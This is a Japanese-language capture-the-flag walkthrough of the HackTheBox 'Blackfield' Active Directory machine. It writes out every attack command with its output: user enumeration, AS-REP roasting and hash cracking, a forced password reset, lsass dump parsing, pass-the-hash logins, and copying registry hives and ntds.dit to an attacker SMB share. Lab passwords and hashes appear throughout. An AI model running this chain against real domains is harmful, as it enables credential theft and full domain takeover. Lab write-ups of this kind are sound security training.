## STEP 1
```sh
└─$ rustscan -a 10.129.194.101 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.194.101:53
Open 10.129.194.101:88
Open 10.129.194.101:135
Open 10.129.194.101:389
Open 10.129.194.101:445
Open 10.129.194.101:593
Open 10.129.194.101:3268
Open 10.129.194.101:5985
10.129.194.101 -> [53,88,135,389,445,593,3268,5985]
```

## STEP 2
guestでsmb列挙成功  
profile$にread権限があったが、314個のフォルダは確認できたがファイルは何一つ確認されなかった
```sh
└─$ netexec smb 10.129.194.101 -u ' ' -p '' -M spider_plus
SMB         10.129.194.101  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False) 
SMB         10.129.194.101  445    DC01             [+] BLACKFIELD.local\ : (Guest)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.194.101  445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.194.101  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.194.101  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.194.101  445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.194.101  445    DC01             [*] Enumerated shares
SMB         10.129.194.101  445    DC01             Share           Permissions     Remark
SMB         10.129.194.101  445    DC01             -----           -----------     ------
SMB         10.129.194.101  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.194.101  445    DC01             C$                              Default share
SMB         10.129.194.101  445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.194.101  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.194.101  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.194.101  445    DC01             profiles$       READ            
SMB         10.129.194.101  445    DC01             SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.194.101  445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.194.101.json".
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Readable Shares:  2 (IPC$, profiles$)
SPIDER_PLUS 10.129.194.101  445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Total folders found:  314
SPIDER_PLUS 10.129.194.101  445    DC01             [*] Total files found:    0

└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.194.101.json 
{
    "profiles$": {}
}
```
フォルダ名を確認すると、ユーザ名っぽい
```sh
└─$ smbclient -N -c 'ls' //10.129.194.101/profiles$ | awk '{print $1}' > users.txt

└─$ head users.txt 
.
..
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
ACheretei
ACsonaki
```
もしかしたらユーザプロファイルがsmb共有されているかも  
ということでprofile$内のフォルダ名と同じユーザ名を探索、３つ発見した
```sh
└─$ ./kerbrute_linux_amd64 userenum --dc 10.129.194.101 -d 'BLACKFIELD.local' users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/17/25 - Ronnie Flathers @ropnop

2025/10/17 09:28:27 >  Using KDC(s):
2025/10/17 09:28:27 >   10.129.194.101:88

2025/10/17 09:28:52 >  [+] VALID USERNAME:       audit2020@BLACKFIELD.local
2025/10/17 09:31:09 >  [+] VALID USERNAME:       support@BLACKFIELD.local
2025/10/17 09:31:10 >  [+] VALID USERNAME:       svc_backup@BLACKFIELD.local
2025/10/17 09:31:44 >  Done! Tested 314 usernames (3 valid) in 196.094 seconds
```
有効なユーザ名の中で、supportがasreproastingできた
```sh
└─$ cat user.txt
audit2020
support
svc_backup

└─$ netexec ldap 10.129.194.101 -u user.txt -p '' --asreproast asreproast.txt 
LDAP        10.129.194.101  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)mv 
LDAP        10.129.194.101  389    DC01             $krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e52fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6
```
クラック成功！  
supportのパスワードは、#00^BlackKnight
```sh
└─$ name-that-hash -f asreproast.txt --no-banner 

$krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e5
2fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff
447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory

└─$ hashcat -a 0 -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt --quite     
$krb5asrep$23$support@BLACKFIELD.LOCAL:f32ca361a3a484daa399ca9f525d0b89$86578269ef5fca41779ecac41f4fd6d1387033b9903c8d15b3706520528fcc8d5c9dfe07259b8576b80842301e99cac69a501265f8713dccf7b348316c7386c210e4aa13052f7668f8c81cb08eaf5b3381e52fb8fa6cdf5f3b326a39666b169acdfc4188830ea4071078e182f6e780d947c1182a309bd92b86f392f3e38be0fac2d9185a02203610e2caf556b48684f7836bf1fbdc43f40a05accd0f78532d4bf1d35946fa033ba9dba73acd1485eed1a5a8273b9af1b1b36f7086d9401409f9cf47df28ba809eff447d257c37202bdfcf5936e3616661129b5990cfb3389bd1278aa920235ab5a83d4e0342ea807c70f05ffeb6:#00^BlackKnight
```
step1で5985番が開いているのを確認したが、svc_backupユーザでしかwinrmログインできないもよう
```sh
└─$ netexec ldap 10.129.194.101 -u 'support' -p '#00^BlackKnight' --groups 'Remote Management Users'
LDAP        10.129.194.101  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.194.101  389    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
LDAP        10.129.194.101  389    DC01             svc_backup
```


## STEP 3
bloodhoundを回す
```ksh
└─$ netexec ldap 10.129.194.101 -d 'blackfield.local' --dns-server 10.129.194.101 -u 'support' -p '#00^BlackKnight' --bloodhound --collection All
LDAP        10.129.194.101  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
LDAP        10.129.194.101  389    DC01             [+] blackfield.local\support:#00^BlackKnight 
LDAP        10.129.194.101  389    DC01             Resolved collection methods: psremote, objectprops, dcom, rdp, session, localadmin, container, acl, group, trusts
LDAP        10.129.194.101  389    DC01             Done in 02M 22S
LDAP        10.129.194.101  389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.194.101_2025-10-19_004440_bloodhound.zip
```
audit2020に対して`ForceChangePaasord`権限を有していることを確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Blackfield_01.png">  
audit2020のパスワードをsupportと同一のものに変更
```sh
└─$ impacket-changepasswd -ts -newpass '#00^BlackKnight' -no-pass -altuser support -altpass '#00^BlackKnight' -reset 'blackfield.local/audit2020@10.129.194.101'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-10-19 01:47:21] [*] Setting the password of blackfield.local\audit2020 as blackfield.local\support
[2025-10-19 01:47:21] [*] Connecting to DCE/RPC as blackfield.local\support
[2025-10-19 01:47:38] [*] Password was changed successfully.
[2025-10-19 01:47:38] [!] User no longer has valid AES keys for Kerberos, until they change their password again.
```


## STEP 4
新たにforensicが読み取り可能に
```sh
└─$ netexec smb 10.129.194.101 -u 'audit2020' -p '#00^BlackKnight' --shares
SMB         10.129.194.101  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.194.101  445    DC01             [+] BLACKFIELD.local\audit2020:#00^BlackKnight 
SMB         10.129.194.101  445    DC01             [*] Enumerated shares
SMB         10.129.194.101  445    DC01             Share           Permissions     Remark
SMB         10.129.194.101  445    DC01             -----           -----------     ------
SMB         10.129.194.101  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.194.101  445    DC01             C$                              Default share
SMB         10.129.194.101  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.194.101  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.194.101  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.194.101  445    DC01             profiles$       READ            
SMB         10.129.194.101  445    DC01             SYSVOL          READ            Logon server share
```
メモリダンプのようなものを発見  
lsass.exeのメモリダンプもあるのでクレデンシャルを取得できるかも
```sh
└─$ smbclient -U 'blackfield.local/audit2020%#00^BlackKnight' //10.129.194.101/forensic 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1685557 blocks available

smb: \> cd memory_analysis

smb: \memory_analysis\> ls
  .                                   D        0  Thu May 28 16:28:33 2020
  ..                                  D        0  Thu May 28 16:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 16:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 16:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 16:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 16:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 16:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 16:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 16:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 16:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 16:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 16:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 16:27:53 2020

                5102079 blocks of size 4096. 1685557 blocks available
```
lsassをダウンロード、めっちゃ時間かかった
```sh
└─$ smbget -U 'blackfield.local/audit2020%#00^BlackKnight' smb://10.129.194.101/forensic/memory_analysis/lsass.zip
Using domain: BLACKFIELD.LOCAL, user: audit2020
Using domain: BLACKFIELD.LOCAL, user: audit2020
smb://10.129.194.101/forensic/memory_analysis/lsass.zip
                
Downloaded 39.99MB in 1961 seconds
```
windows上のmimikatzでも可能だが、今回はpython製のpypykatzを使用  
svc_backupのntハッシュを取得
```sh
└─$ pypykatz lsa minidump lsass.DMP -p msv       
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000

~~~省略~~~
```
winrmでログイン成功！  
ユーザフラグゲット
```powershell
└─$ evil-winrm -i 10.129.194.101 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_backup\Documents> ls ../Desktop


    Directory: C:\Users\svc_backup\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt


*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ../Desktop/user.txt
3920bb317a0bef51027e2852be64b543
```
ちなみにadministratorのntハッシュも取得したが、こちらはログイン失敗した  
多分lsassをダンプした以降にパスワードが変更されてそう
```sh
== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000
```


## STPE 5
`Backup Operators`に所属していることを確認
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
マシン「Return」の際は`SeBackupPrivilege`権限でrobocopyによるルートフラグコピーを実施したが、今回はアクセス拒否された  
[他writeup](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#beyond-root---efs)から、別プロセスがルートフラグをつかんでいるっぽいことが推測
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy "C:\Users\administrator\Desktop" "C:\Users\svc_back_up\Documents\" "root.txt" /B /NFL /NDL /NJH /NJS

2025/10/20 04:04:12 ERROR 5 (0x00000005) Copying File C:\Users\administrator\Desktop\root.txt
Access is denied.
```
[BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA)を使用してレジストリをダンプする  
ちなみに自分でコンパイルする必要あり  
レジストリをダンプしたら、kaliのsmbサーバにコピー
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> .\BackupOperatorToDA_x86.exe -t \\dc01.blackfield.local -o C:\Users\svc_backup\Documents\
Dumping SAM hive to C:\Users\svc_backup\Documents\SAM
Dumping SYSTEM hive to C:\Users\svc_backup\Documents\SYSTEM
Dumping SECURITY hive to C:\Users\svc_backup\Documents\SECURITY

*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy SYSTEM \\10.10.16.15\share\

*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy SECURITY \\10.10.16.15\share\
```
ダンプしたレジストリからクレデンシャルをダンプ  
ドメコンのマシンアカウントのntハッシュを取得したが、マシンアカウントではdcsync攻撃はできなかった  
（ログインは可能であり、マシンアカウントからドメインに対するDS-Replication-Get-Changes-All権限も確認したが）
```sh
└─$ impacket-secretsdump -system SYSTEM -security SECURITY LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:eecc8a8d73b1a96fcc2e16becee44ca656fed69e141c85e0a4cbfa8aa311ea206ef3630e56a343b80e98b87c101977a672315af30183380d9e7b756b4ecda3247f6fd4a88e5e82f327447c9f3569fbd91c40b092bf0ceb8f7aebc5ec1e8bfc812b23b7a6198de274d4587a16c9fd94b72f452632212bec67ade8cd0edcb2fdcdd34130d9b0e535c47d037065b833161b2530c8a66f45c88c9f8bbb34495a71df4567675b93e0425e8f817300c6faf67fbde796b9ecbd2981685fb7d6ac866e0aec1e8e65696dd139a20205691bf9122c5246629656bf9016fe3a7f07041ec2b0037711f087fcef5690219326f1358274
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b1be51c3147516896f0398ec99c53efb
[*] DefaultPassword 
(Unknown User):###_ADM1N_3920_###
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xd4834e39bca0e657235935730c045b1b9934f690
dpapi_userkey:0x9fa187c3b866f3a77c651559633e2e120bc8ef6f
[*] NL$KM 
 0000   88 01 B2 05 DB 70 7A 0F  EF 52 DF 06 96 76 4C A4   .....pz..R...vL.
 0010   BD 6E 62 D1 06 63 1A 7E  31 2F A2 6D F8 6C 42 50   .nb..c.~1/.m.lBP
 0020   FC 8D 5C A4 FC 46 1B DC  7E CA 7E 76 7F 5E C2 74   ..\..F..~.~v.^.t
 0030   CF EB B6 1F 99 8A 29 CF  2C D1 1D 55 C6 01 2E 6F   ......).,..U...o
NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc461bdc7eca7e767f5ec274cfebb61f998a29cf2cd11d55c6012e6f
[*] Cleaning up...
```
pypykatz上でデフォルトパスワード`###_ADM1N_3920_###`を確認  
なんとadministratorのパスワードでログインできた！ルートフラグゲット
```sh
└─$ evil-winrm -i 10.129.165.239 -u administrator -p '###_ADM1N_3920_###'           
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
4375a629c7c67c8e29db269060c955cb
```

## おまけ
今回はレジストリsystemとsecurityからadministratorのdefaultPasswordを取得できたが、ntdsをダンプする手法もある  
[リンク](https://pentestlab.blog/tag/diskshadow/)を参考  
vssadminの実行には管理者権限が必要・wbadminは実行エラーだったので、diskshadowコマンドを実行する  
diskshadowコマンドはスクリプトモードで動作するため、スクリプトを作成する  
```sh
└─$ cat diskshadow.txt 
set metadata C:\windows\temp\meta.cab
set context persistent nowriters
add volume c: alias test
create
expose %test% z:

└─$ unix2dos diskshadow.txt 
unix2dos: converting file diskshadow.txt to DOS format...

└─$ impacket-smbserver share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
zドライブ上にボリュームシャドーコピーが作成された
```powershell
*Evil-WinRM* PS C:\users\svc_backup\documents> copy \\10.10.16.15\share\diskshadow.txt .

*Evil-WinRM* PS C:\users\svc_backup\documents> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/20/2025 6:44:27 PM

-> set metadata C:\windows\temp\meta.cab
The existing file will be overwritten.
-> set context persistent nowriters
-> add volume c: alias test
-> create
Alias test for shadow ID {1d96380d-441a-498a-b44b-157a9008afbd} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {89db8686-5e19-4177-9d23-54aa423292ee} set as environment variable.

Querying all shadow copies with the shadow copy set ID {89db8686-5e19-4177-9d23-54aa423292ee}

        * Shadow copy ID = {1d96380d-441a-498a-b44b-157a9008afbd}               %test%
                - Shadow copy set: {89db8686-5e19-4177-9d23-54aa423292ee}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/20/2025 6:44:29 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %test% z:
-> %test% = {1d96380d-441a-498a-b44b-157a9008afbd}
The shadow copy was successfully exposed as z:\.
->

*Evil-WinRM* PS C:\users\svc_backup\documents> ls z:\


    Directory: z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/26/2020   5:38 PM                PerfLogs
d-----         6/3/2020   9:47 AM                profiles
d-r---        3/19/2020  11:08 AM                Program Files
d-----         2/1/2020  11:05 AM                Program Files (x86)
d-r---       10/20/2025   4:04 AM                Users
d-----        9/21/2020   4:29 PM                Windows
-a----        2/28/2020   4:36 PM            447 notes.txt
````
robocopyコマンドでntds.ditをコピー、kaliに転送
```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Documents> robocopy z:\windows\ntds\ . ntds.dit /b /np /njh /njs

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit

*Evil-WinRM* PS C:\Users\svc_backup\Documents> copy ntds.dit \\10.10.16.15\share\
```
systemレジストリを使用して、クレデンシャルダンプできた
```sh
└─$ impacket-secretsdump -system SYSTEM -ntds ntds.dit -just-dc-ntlm LOCAL | grep -i 'administrator'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```
ちなみに作成したvssは削除可能
```powershell
*Evil-WinRM* PS C:\users\svc_backup\documents> diskshadow.exe /s del.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/20/2025 6:26:38 PM

-> delete shadows id {1d96380d-441a-498a-b44b-157a9008afbd}
Deleting shadow copy {1d96380d-441a-498a-b44b-157a9008afbd}...

1 shadow copy deleted.
```
